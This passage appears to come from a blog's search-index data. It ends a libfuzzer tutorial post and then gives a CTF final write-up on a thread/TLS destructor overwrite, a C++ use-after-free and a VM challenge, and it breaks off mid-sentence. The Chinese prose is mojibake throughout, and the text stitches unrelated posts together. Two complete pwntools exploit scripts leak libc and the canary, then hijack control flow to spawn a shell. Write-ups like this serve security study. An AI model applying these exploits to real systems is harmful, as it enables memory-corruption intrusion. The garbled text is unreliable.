æ­¤åœ¨æ‰§è¡Œfuzzerçš„æ—¶å€™é€‰æ‹©åˆé€‚çš„max_len(å¦‚æœ¬ä¾‹ä¸­çš„max_lenåœ¨100~1000æ¯”è¾ƒåˆé€‚)ä¼šä½¿å¾—æˆ‘ä»¬fuzzeræ¢æµ‹åˆ°æ›´å¤šçš„ä»£ç å—ï¼Œå¾—åˆ°crashçš„æ•ˆç‡ä¹Ÿå°±è¶Šå¤§ã€‚ æ€»ç»“libfuzzer workshopåˆ°æ­¤å°±å…¨éƒ¨å­¦ä¹ å®Œäº†ã€‚libfuzzerä½œä¸ºæœ€å¸¸ç”¨çš„fuzzå·¥å…·ï¼Œå®ƒæ‰€æ¶‰åŠåˆ°çš„ä¸€äº›ä½¿ç”¨æ–¹æ³•åœ¨workshopé‡Œéƒ½æœ‰ç›¸åº”çš„lessonã€‚å°±æˆ‘ä¸ªäººè€Œè¨€ï¼Œåœ¨é€æ­¥å­¦ä¹ libfuzzerçš„è¿‡ç¨‹ä¸­æ„Ÿè§‰åˆ°libfuzzerå¯¹äºå¼€æºåº“æä¾›çš„æ¥å£å‡½æ•°çš„fuzzæ˜¯ååˆ†å¼ºåŠ›çš„ï¼Œè€Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬åœ¨å­¦ä¹ libfuzzerä¸­çš„éš¾ç‚¹:å¦‚ä½•èƒ½å¤Ÿè®¾è®¡å‡ºåˆç†çš„harnessï¼Œè¿™éœ€è¦æˆ‘ä»¬å¯¹è¦fuzzçš„å¼€æºåº“æä¾›çš„æ–¹æ³•æœ‰ä¸€å®šçš„äº†è§£ï¼Œç»è¿‡æ”»å‡»é¢åˆ†æç­‰å»é€æ­¥æ”¹å–„æˆ‘ä»¬çš„harnessï¼Œä½¿å¾—æˆ‘ä»¬ä¸è·å¾—crashæ›´è¿‘ä¸€æ­¥ã€‚ åˆå­¦libfuzzerï¼Œæœ‰é”™è¯¯ç–å¿½ä¹‹å¤„çƒ¦è¯·å„ä½å¸ˆå‚…æŒ‡æ­£ã€‚","link":"/2021/01/06/libfuzzer3/"},{"title":"å›½èµ›_final","text":"å›½èµ›_final inæ­¦æ±‰ ç¬¬äºŒæ¬¡æ‰“çº¿ä¸‹äº†ï¼Œå‡ºç°äº†å¾ˆå¤šé—®é¢˜ã€‚ç°åœ¨çš„å¤§æ¯”èµ›åŸºæœ¬ä¸æ€ä¹ˆå‡ºheapç›¸å…³çš„å¥—è·¯é¢˜ç›®äº†ï¼ˆé™¤äº†é’ˆå¯¹æ–°ç‰ˆlibcçš„ä¸€äº›åˆ©ç”¨æ–¹å¼å’Œå¤æ‚çš„å †é£æ°´ä¹‹å¤–ï¼‰ï¼Œæ¯”è¾ƒå¸¸å‡ºçš„é¢˜å‹æœ‰vmpwnï¼Œå¼‚æ„æ¶ä¸‹ï¼ˆmips,armï¼‰çš„pwnï¼ŒC++ç¨‹åºä»¥åŠä¸€äº›åº•å±‚æœºåˆ¶çš„æ¼æ´ã€‚åŒæ—¶é€†å‘ä¹Ÿéšä¹‹å¢å¤§ã€‚è¦åŠ å¼ºè‡ªå·±çš„é€†å‘åŠŸåº•äº†ã€‚ day1ç¬¬ä¸€å¤©æ˜¯awdï¼Œå¹³å°å´©äº†ï¼Œè¢«è¿«åœèµ›ã€‚æˆ‘ä¹Ÿä¸å¤šbbå¹³å°äº†ï¼Œç€çœ¼äºé¢˜ç›®å§ï¼ˆè´¨é‡è¿˜æ˜¯æŒºé«˜çš„ï¼‰ã€‚æŒ‰é¢˜ç›®çš„éš¾æ˜“ç¨‹åº¦æ¥å§ï¼š pwn3ä¸€é“çº¿ç¨‹pwné¢˜ã€‚ 123456while ( 1 ) { if ( pthread_create(&amp;newthread, 0LL, (void *(*)(void *))start_routine, 0LL) == -1 ) puts(&quot;create thread failed&quot;); pthread_join(newthread, 0LL); } æ¼æ´åœ¨äºstart_routineé‡Œçš„__printf_chkå­˜åœ¨fmtä»¥åŠæ ˆæº¢å‡ºã€‚ 1234567891011121314unsigned __int64 __fastcall start_routine(void *a1){ char v2; // [rsp+0h] [rbp-40h] unsigned __int64 v3; // [rsp+38h] [rbp-8h] __int64 retaddr; // [rsp+48h] [rbp+8h] v3 = __readfsqword(0x28u); ret_address = (__int64)&amp;retaddr; save_ret = retaddr; gets(&amp;v2); __printf_chk(1LL, (__int64)&amp;v2); *(_QWORD *)ret_address = save_ret; return v3 - __readfsqword(0x28u);} __printf_chkå‡½æ•°ä¼šæ£€æµ‹%nä»¥åŠ%()$()è¿™æ ·çš„çš„æ ¼å¼ï¼Œå› æ­¤åªèƒ½ç”¨-%p-%p-è¿™æ ·æ³„éœ²äº†ã€‚ç”±äºç¨‹åºå­˜åœ¨å†™å›ret_addrçš„æ“ä½œï¼Œå¯¼è‡´æ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€çš„æ–¹æ³•å¤±æ•ˆäº†ï¼Œè¿™ä¹Ÿæ˜¯è¿™é“é¢˜çš„éš¾ç‚¹æ‰€åœ¨ã€‚ é‡ç‚¹ï¼Œè®°ç¬”è®°ï¼šåœ¨çº¿ç¨‹ä¸­å­˜åœ¨ä¸€ç§TSLæœºåˆ¶ï¼šå¦‚æœéœ€è¦åœ¨ä¸€ä¸ªçº¿ç¨‹å†…éƒ¨çš„å„ä¸ªå‡½æ•°è°ƒç”¨éƒ½èƒ½è®¿é—®ã€ä½†å…¶å®ƒçº¿ç¨‹ä¸èƒ½è®¿é—®çš„å˜é‡ï¼ˆè¢«ç§°ä¸ºstatic memory local to a thread çº¿ç¨‹å±€éƒ¨é™æ€å˜é‡ï¼‰ï¼Œå°±éœ€è¦æ–°çš„æœºåˆ¶æ¥å®ç°ï¼Œè¿™å°±æ˜¯TLSã€‚æˆ‘ä»¬ç†ŸçŸ¥çš„canaryå°±æ˜¯å­˜æ”¾åœ¨tlsä¸­ï¼Œåœ¨retæ—¶å’Œstackä¸­çš„canaryæ¯”è¾ƒã€‚ å…¶ç»“æ„ä½“ä¸ºï¼š 1234567891011121314151617181920212223242526272829typedef struct{ void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; int gscope_flag; uintptr_t sysinfo; uintptr_t stack_guard; /*canary uintptr_t pointer_guard; unsigned long int vgetcpu_cache[2]; /* Bit 0: X86_FEATURE_1_IBT. Bit 1: X86_FEATURE_1_SHSTK. */ unsigned int feature_1; int __glibc_unused1; /* Reservation of some values for the TM ABI. */ void *__private_tm[4]; /* GCC split stack support. */ void *__private_ss; /* The lowest address of shadow stack, */ unsigned long long int ssp_base; /* Must be kept even if it is no longer used by glibc since programs, like AddressSanitizer, depend on the size of tcbhead_t. */ __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32))); void *__padding[8];} tcbhead_t; åœ¨å†…å­˜ä¸­å¦‚ä¸‹ï¼š 12345678910111213141516171819202122rsp=0x7facd4d2bea8telescope 0x7facd4d2c700 10000:0000â”‚ r8 r9 0x7facd4d2c700 â—‚â€” 0x7facd4d2c70001:0008â”‚ 0x7facd4d2c708 â€”â–¸ 0x563b164dc270 â—‚â€” 0x102:0010â”‚ 0x7facd4d2c710 â€”â–¸ 0x7facd4d2c700 â—‚â€” 0x7facd4d2c70003:0018â”‚ 0x7facd4d2c718 â—‚â€” 0x104:0020â”‚ 0x7facd4d2c720 â—‚â€” 0x005:0028â”‚ 0x7facd4d2c728 â—‚â€” 0xfe0c23c58eab120006:0030â”‚ 0x7facd4d2c730 â—‚â€” 0x6bdca8fe08e79c207:0038â”‚ 0x7facd4d2c738 â—‚â€” 0x0... â†“58:02c0â”‚ 0x7facd4d2c9c0 â€”â–¸ 0x7facd53382b0 (stack_used) â—‚â€” 0x7facd4d2c9c0... â†“5a:02d0â”‚ r10 0x7facd4d2c9d0 â—‚â€” 0xb6c /* 'l\\x0b' */5b:02d8â”‚ 0x7facd4d2c9d8 â€”â–¸ 0x7facd4d2c9e0 â—‚â€” 0x7facd4d2c9e0... â†“5d:02e8â”‚ 0x7facd4d2c9e8 â—‚â€” 0xffffffffffffffe05e:02f0â”‚ 0x7facd4d2c9f0 â—‚â€” 0x0... â†“60:0300â”‚ 0x7facd4d2ca00 â€”â–¸ 0x7facd4d2bf10 â€”â–¸ 0x7facd4d2c700 â—‚â€” 0x7facd4d2c70061:0308â”‚ 0x7facd4d2ca08 â—‚â€” 0x0 å¯è§,tlsæ˜¯åœ¨stackä¸Šçš„ï¼ˆæ¯”è¾ƒä¸‹é¢ï¼‰,å¯ä»¥é€šè¿‡å¤§èŒƒå›´çš„æ ˆæº¢å‡ºè¦†ç›–ã€‚ ä¹‹åæˆ‘ä»¬å‘é€â€™aâ€™*0x38+p64(canary)+â€™aâ€™*0x400ï¼ˆå¤§èŒƒå›´çš„è¦†ç›–ï¼‰ä¹‹åæŸ¥çœ‹ç¨‹åºçš„æµç¨‹å˜åŒ–ï¼š 123456789101112 0x563b14c06207 &lt;start_routine+110&gt; nop 0x563b14c06208 &lt;start_routine+111&gt; mov rax, qword ptr [rbp - 8] 0x563b14c0620c &lt;start_routine+115&gt; sub rax, qword ptr fs:[0x28] 0x563b14c06215 &lt;start_routine+124&gt; je start_routine+131 &lt;start_routine+131&gt; â†“ 0x563b14c0621c &lt;start_routine+131&gt; leaveâ–º 0x563b14c0621d &lt;start_routine+132&gt; ret &lt;0x7facd51256db; start_thread+219&gt; â†“ 0x7facd51256db &lt;start_thread+219&gt; mov qword ptr fs:[0x630], rax 0x7facd51256e4 &lt;start_thread+228&gt; call __call_tls_dtors@plt &lt;__call_tls_dtors@plt&gt; 0x7facd51256e9 &lt;start_thread+233&gt; xor eax, eax å…¶ä¸­__call_tls_dtorså‡½æ•°æ¥ææ„çº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼Œdiassembleçœ‹ä¸‹ï¼š 1234567891011121314151617181920212223242526272829pwndbg&gt; disassemble __call_tls_dtorsDump of assembler code for function __GI___call_tls_dtors: 0x00007facd4d70990 &lt;+0&gt;: push rbp 0x00007facd4d70991 &lt;+1&gt;: push rbx 0x00007facd4d70992 &lt;+2&gt;: sub rsp,0x8 0x00007facd4d70996 &lt;+6&gt;: mov rbp,QWORD PTR [rip+0x3a73c3] # 0x7facd5117d60 0x00007facd4d7099d &lt;+13&gt;: mov rbx,QWORD PTR fs:[rbp+0x0] 0x00007facd4d709a2 &lt;+18&gt;: test rbx,rbx 0x00007facd4d709a5 &lt;+21&gt;: je 0x7facd4d709ee &lt;__GI___call_tls_dtors+94&gt; 0x00007facd4d709a7 &lt;+23&gt;: nop WORD PTR [rax+rax*1+0x0] 0x00007facd4d709b0 &lt;+32&gt;: mov rdx,QWORD PTR [rbx+0x18] 0x00007facd4d709b4 &lt;+36&gt;: mov rax,QWORD PTR [rbx] 0x00007facd4d709b7 &lt;+39&gt;: mov rdi,QWORD PTR [rbx+0x8] 0x00007facd4d709bb &lt;+43&gt;: ror rax,0x11 0x00007facd4d709bf &lt;+47&gt;: xor rax,QWORD PTR fs:0x30 0x00007facd4d709c8 &lt;+56&gt;: mov QWORD PTR fs:[rbp+0x0],rdx 0x00007facd4d709cd &lt;+61&gt;: call rax 0x00007facd4d709cf &lt;+63&gt;: mov rax,QWORD PTR [rbx+0x10] 0x00007facd4d709d3 &lt;+67&gt;: lock sub QWORD PTR [rax+0x450],0x1 0x00007facd4d709dc &lt;+76&gt;: mov rdi,rbx 0x00007facd4d709df &lt;+79&gt;: call 0x7facd4d4e2c8 &lt;free@plt&gt; 0x00007facd4d709e4 &lt;+84&gt;: mov rbx,QWORD PTR fs:[rbp+0x0] 0x00007facd4d709e9 &lt;+89&gt;: test rbx,rbx 0x00007facd4d709ec &lt;+92&gt;: jne 0x7facd4d709b0 &lt;__GI___call_tls_dtors+32&gt; 0x00007facd4d709ee &lt;+94&gt;: add rsp,0x8 0x00007facd4d709f2 &lt;+98&gt;: pop rbx 0x00007facd4d709f3 &lt;+99&gt;: pop rbp 0x00007facd4d709f4 &lt;+100&gt;: retEnd of assembler dump. å…¶ä¸­ï¼Œmov rbx,QWORD PTR fs:[rbp+0x0]ä½¿å¾—æˆ‘ä»¬é€šè¿‡æ ˆæº¢å‡ºæ”¹å†™tlsçš„å†…å®¹ï¼ˆä¹Ÿå³fsï¼‰ï¼Œè¿›è€Œæ§åˆ¶rbxï¼Œä½¿å¾—å…¶ä¸è·³è½¬å¹¶ç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚rax,QWORD PTR [rbx]ï¼Œraxä¹Ÿå¯æ§ï¼Œåªæ˜¯è¦ç»è¿‡ror rax,0x11å’Œxor rax,QWORD PTR fs:0x30çš„è¿ç®—åç»“æœä¸ºone_gadgetï¼Œä¹‹åcall raxæ‹¿shellã€‚å› æ­¤æˆ‘ä»¬å°±è¦æå‰å¸ƒç½®å¥½fsçš„å†…å®¹ã€‚ exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *context.arch='amd64'context.log_level='debug'def debug(addr,PIE=True): if PIE: text_base = int(os.popen(&quot;pmap {}| awk '{{print $1}}'&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *{}'.format(hex(text_base+addr))) else: gdb.attach(p,&quot;b *{}&quot;.format(hex(addr)))def rol(value): low = (value&amp;0xffff800000000000)&gt;&gt;47 hight = (value&amp;0x7fffffffffff)&lt;&lt;17 return hight | lowdef ror(value): hight = (value&amp;0x1ffff)&lt;&lt;47 low = (value&amp;0xfffffffffffe0000)&gt;&gt;17 return hight | lowdef main(host,port=9999): global p if host: p = remote(host,port) else: p = process(&quot;./pwn3&quot;) # p = process(&quot;./pwn&quot;,env={&quot;LD_PRELOAD&quot;:&quot;./x64_libc.so.6&quot;}) # gdb.attach(p,&quot;b *0x0000000000400A5F&quot;) debug(0x0000000000011F1) p.sendline(&quot;+%p-%p-%p-%p%-%p-%p-%p-%p%-%p-%p-%p-%p-%p+%p=&quot;) p.recvuntil('+') libc.address = int(p.recvuntil('-')[:-1],16) - 0x3ed8d0 info('libc : '+hex(libc.address)) p.recvuntil('+') canary = int(p.recvuntil('=')[:-1],16) info('canary : '+hex(canary)) sleep(0.3) payload = &quot;%p&quot;*(0x38/2)+p64(canary) p.sendline(payload) p.recvuntil(hex(libc.address-0x900)*2) p.recvuntil(&quot;0x&quot;) xor1 = int(p.recvuntil(&quot;0x&quot;)[:-2],16) p.recvuntil(&quot;(nil)(nil)&quot;) p.recvuntil(&quot;0x&quot;) p.recvuntil(&quot;0x&quot;) xor2 = int(p.recvuntil(&quot;0x&quot;)[:-2],16) # info(&quot;xor1: &quot; + hex(xor1)) info(&quot;xor2: &quot; + hex(xor2)) xor1 = libc.address-0x1100 sleep(0.3) one = 0x4f3c2 + libc.address payload = &quot;A&quot;*0x38+p64(canary)*2+p64(one) payload += p64(0)+p64(libc.address-0x900)*2 payload += p64(0)+p64(libc.address-0x1040)+p64(rol((ror(xor2)^xor1)^one)) payload += p64(0)*0xe8+p64(0x3ec560+libc.address)+p64(libc.address-0x248) payload += p64(libc.address-0x10d8)*0x10+p64(libc.address-0x10d8) p.sendline(payload) p.interactive()if __name__ == &quot;__main__&quot;: libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;,checksec=False) # libc = ELF(&quot;./x64_libc.so.6&quot;,checksec=False) # elf = ELF(&quot;./babyheap&quot;,checksec=False) main(args['REMOTE']) pwn4ç¬¬äºŒé“å°±æ˜¯ä¸€é“C++çš„é¢˜ç›®äº†ï¼Œpwnable.twä¸Šçš„åŸé¢˜CAOVã€‚æ¼æ´åœ¨äºæµ…æ‹·è´å¯¼è‡´çš„ææ„å‡½æ•°ä¼šdeleå­˜åœ¨äºstackä¸Šçš„æŒ‡é’ˆï¼Œè€Œè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘çš„æ˜¯æˆ‘ä»¬çš„passwordç»“æ„ï¼Œä»è€Œåœ¨æˆ‘ä»¬å¯ä»¥åˆ©ç”¨chang_password()å½¢æˆç±»ä¼¼äºUAFçš„æ•ˆæœã€‚ æ¼æ´ä»£ç ï¼š 123456789101112131415161718192021unsigned __int64 edit_info(){ __int64 v0; // rbx __int64 v1; // rax __int64 v2; // rax char v4; // [rsp+0h] [rbp-50h] char v5; // [rsp+20h] [rbp-30h] unsigned __int64 v6; // [rsp+38h] [rbp-18h] v6 = __readfsqword(0x28u); initial((__int64)&amp;v4); sub_401DDA((__int64)&amp;v5, (__int64)&amp;v4, (const char **)qword_6032A0); dele((__int64)&amp;v5); //bug v0 = sub_402164((__int64)&amp;v4); v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;STUDENT: &quot;); v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v1, v0); std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); sub_401E6C(qword_6032A0); dele((__int64)&amp;v4); return __readfsqword(0x28u) ^ v6;} æ•ˆæœå±•ç¤ºï¼š 1234567800:0000â”‚ rsp 0x7ffc82d0fa50 â€”â–¸ 0x1985c60 â—‚â€” 'PB19000001'01:0008â”‚ 0x7ffc82d0fa58 â—‚â€” 0x6400000064 /* 'd' */... â†“03:0018â”‚ 0x7ffc82d0fa68 â—‚â€” 0x21 /* '!' */04:0020â”‚ rax rdi 0x7ffc82d0fa70 â€”â–¸ 0x6032f0 â—‚â€” 0x005:0028â”‚ 0x7ffc82d0fa78 â—‚â€” 0x21 /* '!' */06:0030â”‚ 0x7ffc82d0fa80 â—‚â€” 0x007:0038â”‚ 0x7ffc82d0fa88 â—‚â€” 0x3fdc5116f3e23a00 ä½äºrsp+0x20çš„ä½ç½®å­˜åœ¨çš„0x6032f0ä¼šè¢«deleï¼Œç”±äºæˆ‘ä»¬æå‰change_passwordä½¿å¾—æ„é€ å¦‚ä¸‹ï¼š 1234567891011pwndbg&gt; x/20gx 0x6032e00x6032e0: 0x0000000000000000 0x00000000000000710x6032f0: 0x0000000000000000 0x00000000000000000x603300: 0x0000000000000000 0x00000000000000000x603310: 0x0000000000000000 0x00000000000000000x603320: 0x0000000000000000 0x00000000000000000x603330: 0x0000000000000000 0x00000000000000000x603340: 0x0000000000000000 0x00000000000000000x603350: 0x0000000000000000 0x00000000000000210x603360: 0x00000000006032f0 0x00000000000000210x603370: 0x0000000000000000 0x0000000000000000 ä»è€Œä¼šå°†å…¶deleåˆ°0x70çš„fastbinã€‚ ä¹‹åæˆ‘ä»¬è€ƒè™‘å¦‚ä½•æ³„éœ²ï¼š 1234567891011121314151617180x603270: 0x0000000000000000 0x00000000000000000x603280 &lt;stderr&gt;: 0x00007f37cc70b540 0x00007f37cc70b6200x603290: 0x0000000000000000 0x00000000000000000x6032a0: 0x0000000001985c20 0x00000000000000000x6032b0: 0x0000000000000000 0x00000000000000000x6032c0: 0x0000006e696d6461 0x00000000000000000x6032d0: 0x0000000000000000 0x00000000000000000x6032e0: 0x0000000000000000 0x00000000000000710x6032f0: 0x0000000000000000 0x00000000000000000x603300: 0x0000000000000000 0x00000000000000000x603310: 0x0000000000000000 0x00000000000000000x603320: 0x0000000000000000 0x00000000000000000x603330: 0x0000000000000000 0x00000000000000000x603340: 0x0000000000000000 0x00000000000000000x603350: 0x0000000000000000 0x00000000000000210x603360: 0x00000000006032f0 0x00000000000000210x603370: 0x0000000000000000 0x0000000000000000 å¾€ä¸Šé¢çœ‹å‘ç°0x0000000001985c20ä¸ºä¸€ä¸ªå †åœ°å€ï¼Œå…¶heap[0]ä½ç½®çš„æŒ‡é’ˆæŒ‡å‘å­˜æ”¾studentâ€™s nameåœ°å€çš„åœ°å€ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡UAFå°†å †ç”³è¯·åˆ°0x603280é™„ä»¶ï¼ˆæ­£å¥½æœ‰0x7få¯ä»¥åˆ©ç”¨ï¼‰ï¼Œç„¶åä¿®æ”¹0x0001985c20ä¸ºä¸€ä¸ªå­˜æ”¾read_gotçš„åœ°å€ï¼Œå¯ä»¥é€šè¿‡change_passwordå®ç°ã€‚ æ•ˆæœï¼š 123456789101112131415161718192021pwndbg&gt; x/30gx 0x6032e0-0x700x603270: 0x0000000000000000 0x00000000000000000x603280 &lt;stderr&gt;: 0x00007fa9e91f7540 0x00007fa9e91f76200x603290: 0x0000000000000000 0x00000000000000000x6032a0: 0x0000000000603300 0x00000000000000000x6032b0: 0x0000000000000000 0x00000000000000000x6032c0: 0x0000000000000000 0x00000000000000000x6032d0: 0x0000000000000000 0x00000000000000000x6032e0: 0x0000000000000000 0x00000000000000000x6032f0: 0x00000a0000000000 0x00000000000000000x603300: 0x0000000000602f38 0x41414141414141000x603310: 0x4141414141414141 0x41414141414141410x603320: 0x4141414141414141 0x41414141414141410x603330: 0x4141414141414141 0x41414141414141410x603340: 0x4141414141414141 0x41414141414141410x603350: 0x000000000000000a 0x0000000000000021pwndbg&gt; telescope 0x0000000000602f3800:0000â”‚ 0x602f38 â€”â–¸ 0x7fa9e8f29310 (read) â—‚â€” cmp dword ptr [rip + 0x2d2429], 001:0008â”‚ 0x602f40 â€”â–¸ 0x7fa9e8f77b50 (__strncmp_sse42) â—‚â€” test rdx, rdx02:0010â”‚ 0x602f48 â€”â–¸ 0x7fa9e8e52750 (__libc_start_main) â—‚â€” push r1403:0018â”‚ 0x602f50 â€”â–¸ 0x7fa9e8e6c290 (__cxa_atexit) â—‚â€” push r12 leakä¹‹ååˆ©ç”¨uafæ‰“malloc_hookï¼Œæ‹¿shellã€‚å¯¹äº†ï¼ŒaddåŠŸèƒ½æ˜¯é€šè¿‡edit infoæ—¶ä¿®æ”¹nameæ—¶çš„newå®ç°çš„ï¼ŒdeleåŠŸèƒ½æ˜¯é€šè¿‡ææ„å®ç°çš„ã€‚ ruanå¸ˆå‚…çš„exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117from pwn import *context.log_level='debug'context.arch='amd64'def cmd(c): p.recvuntil(&quot;choice:&quot;) p.sendline(str(c))def student(sno): p.recvuntil(&quot;please:&quot;) p.sendline(sno) p.sendlineafter(&quot;grade(0~100):&quot;,'1') for i in range(3): p.sendlineafter(&quot;grade:&quot;,'1')def main(host,port=1234): global p if host: p=remote(host,port) else: p=process(&quot;./pwn4&quot;) name_addr = 0x00000000006032E0 p.recvuntil(&quot;name:&quot;) p.sendline(&quot;admin&quot;) p.recvuntil(&quot;word:&quot;) p.send(&quot;p455w0rd&quot;) # gdb.attach(p) payload = &quot;&quot; payload += p64(0) + p64(0x71) payload = payload.ljust(0x70,&quot;\\x00&quot;) payload += p64(0) + p64(0x21) payload += p64(name_addr+0x10) + p64(0x21) cmd(1) p.recvuntil(&quot;word:&quot;) p.send(payload) student(&quot;aaa&quot;) cmd(2) p.recvuntil(&quot;word:&quot;) payload = p64(0) + p64(0x71) payload += p64(name_addr-0x5b) p.send(payload) cmd(1) p.recvuntil(&quot;word:&quot;) payload = '\\x00' p.send(payload) student(&quot;A&quot;*0x60) # gdb.attach(p) cmd(1) p.recvuntil(&quot;word:&quot;) payload = &quot;&quot; payload += p64(0) + p64(0x71) payload += p64(0)*2 payload += p64(0x0000000000602F38) p.send(payload) payload = &quot;\\x00&quot;*0xb+p64(name_addr+0x20) student(payload.ljust(0x60,&quot;\\x00&quot;)) # gdb.attach(p) cmd(1) p.recvuntil(&quot;word:&quot;) payload = '\\x00' p.send(payload) p.recvuntil(&quot;STUDENT: &quot;) libc.address = u64(p.recvuntil('\\n',drop=True).ljust(8,b&quot;\\x00&quot;))-libc.symbols[&quot;read&quot;] success('libc : '+hex(libc.address)) student(&quot;shabi&quot;) # gdb.attach(p) payload = &quot;&quot; payload += p64(0) + p64(0x71) payload += p64(name_addr+0x30)*12 payload += p64(0) + p64(0x21) payload += p64(name_addr+0x10) + p64(0x21) cmd(1) p.recvuntil(&quot;word:&quot;) p.send(payload) student(&quot;shabi&quot;) cmd(2) p.recvuntil(&quot;word:&quot;) payload = p64(0) + p64(0x71) payload += p64(libc.symbols[&quot;__malloc_hook&quot;]-0x23) p.send(payload) cmd(1) p.recvuntil(&quot;word:&quot;) payload = '\\x00' p.send(payload) student(p64(name_addr+0x30)*12) cmd(1) p.recvuntil(&quot;word:&quot;) payload = '\\x00' p.send(payload) one = 0xf1207+libc.address payload = &quot;\\x00&quot;*0xb+p64(0)+p64(one) student(payload.ljust(0x60,&quot;\\x00&quot;)) payload = &quot;&quot; payload += p64(0) + p64(0x71) payload += p64(name_addr+0x30)*12 payload += p64(0) + p64(0) payload += p64(name_addr) + p64(0) cmd(1) p.recvuntil(&quot;word:&quot;) p.send(payload) # gdb.attach(p) p.interactive()if __name__ == '__main__': libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;,checksec=False) main(args['REMOTE']) ruanå¸ˆå‚…nbï¼ï¼ stackmachineä¸€é“vmç±»å‹çš„é¢˜ç›®ï¼Œé™¤äº†canaryå…¶ä»–ä¿æŠ¤å…¨å¼€ã€‚ç¨‹åºé¦–å…ˆåˆå§‹åŒ–äº†sp,pc,stack,data,codeæ®µï¼Œä¹‹åè¾“å…¥dataå’Œcodeï¼Œç„¶årun(å¸¸è§„çš„VMæ ¼å¼)ã€‚å…ˆæ¥çœ‹ä¸‹åˆå§‹åŒ–çš„æƒ…å†µæŠŠï¼š 123456pwndbg&gt; x/20xg 0x1c480000x1c48000: 0x0000000000000000 0x00000000000000510x1c48010: 0x0000000000000000 0x0000000000000800 //pc &amp; sp0x1c48020: 0x0000000001c48060 0x0000000000001000 //satck &amp; stack size0x1c48030: 0x0000000001c49070 0x0000000000001000 //data &amp; data size0x1c48040: 0x0000000001c4a080 0x0000000000001000 //code &amp; code size æ¥ä¸‹æ¥å°±æ˜¯é€†æŒ‡ä»¤äº†ï¼Œæˆ‘åªæŠŠæœ‰ç”¨åˆ°çš„æŒ‡ä»¤ä»£ç æ˜¾ç¤ºäº†å‡ºæ¥ï¼š 1234567891011121314151617181920212223242526272829303132333435363738case 1u: if ( vm-&gt;_sp &lt;= (unsigned __int64)(vm-&gt;stack_sz - 8) ) { *(_QWORD *)(8 * ((unsigned __int64)vm-&gt;_sp &gt;&gt; 3) + vm-&gt;stack) = *(_QWORD *)(8LL* (*(_QWORD *)(vm-&gt;stack+8 *((unsigned __int64)vm-&gt;_sp &gt;&gt; 3)) &gt;&gt; 3)+ vm-&gt;data); goto LABEL_56; } result = 0xFFFFFFFFLL; break;case 2u: if ( vm-&gt;_sp &lt;= (unsigned __int64)(vm-&gt;stack_sz - 16) )// stack-&gt;data { *(_QWORD *)(vm-&gt;data + 8LL * (*(_QWORD *)(vm-&gt;stack + 8 * ((unsigned __int64)vm-&gt;_sp &gt;&gt; 3)) &gt;&gt; 3)) = *(_QWORD *)(vm-&gt;stack + 8 * (((unsigned __int64)vm-&gt;_sp &gt;&gt; 3) + 1)); vm-&gt;_sp += 0x10LL; goto LABEL_56; } result = 0xFFFFFFFFLL; break;case 3u: if ( vm-&gt;_sp &lt;= (unsigned __int64)(vm-&gt;stack_sz - 16) ) { v2 = *(_QWORD *)(vm-&gt;stack + 8 * ((unsigned __int64)vm-&gt;_sp &gt;&gt; 3)) + *(_QWORD *)(vm-&gt;stack + 8 * (((unsigned __int64)vm-&gt;_sp &gt;&gt; 3) + 1)); vm-&gt;_sp += 8LL; *(_QWORD *)(8 * ((unsigned __int64)vm-&gt;_sp &gt;&gt; 3) + vm-&gt;stack) = v2; goto LABEL_56; } result = 0xFFFFFFFFLL; break;case 0xEu: if ( vm-&gt;_sp &gt; 7uLL ) { vm-&gt;_sp -= 8LL; *(_QWORD *)(8 * ((unsigned __int64)vm-&gt;_sp &gt;&gt; 3) + vm-&gt;stack) = *(_QWORD *)(vm-&gt;code + vm-&gt;_pc + 1); vm-&gt;_pc += 8LL; goto LABEL_56; } result = 0xFFFFFFFFLL; break; è§£é‡Šä¸€ä¸‹0xeï¼šå°†codeæ®µé‡Œæ•°æ®æ”¾å…¥stackæ®µä¸­,pc+=8ï¼ˆç›¸å½“äºpushï¼‰ã€‚0x1ï¼šå°†ä»¥dataä¸ºåŸºåœ°å€ä»¥stackä¸ºåç§»çš„åœ°å€çš„å†…å®¹æ”¾å…¥stackä¸­ã€‚0x2ï¼šå°†stacké¡¶çš„æ•°æ®æ”¾å…¥ä»¥dataä¸ºåŸºåœ°å€ï¼Œä»¥stacké¡¶çš„åä¸€ä¸ªçš„æ•°æ®ä¸ºåç§»çš„åœ°å€å¤„ã€‚ï¼ˆç”±äºstackçš„å†…å®¹å¯æ§ï¼Œå› æ­¤å­˜åœ¨è¶Šç•Œå†™ï¼‰ã€‚0x3ï¼šå°†stacké‡Œçš„ä¸¤æ•°ç›¸åŠ å¹¶å­˜å…¥æ ˆé¡¶ã€‚ è§£ä½“æ€è·¯ï¼š1.é€šè¿‡è§‚å¯Ÿåˆå§‹çš„çŠ¶æ€å¯ä»¥å‘ç°ï¼šdata_ptr=0x01c49070,å’Œè¯¥æŒ‡é’ˆå­˜åœ¨çš„ç»“æ„ä½“çš„ä½ç½®ï¼š0x1c48030åç§»ä¸º-0x1040ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å†å¼€å§‹æ—¶å°†stackä¸­å¡«å…¥puts_got+offset(0x10000000000000000-0x1040),ä¹‹åå†æ‰§è¡Œ2æ“ä½œå³å¯ä¿®æ”¹data_pträ¸ºputs_gotã€‚ 2.ç”±äºdata_ptrè¢«ä¿®æ”¹ä¸ºputs_got,å› 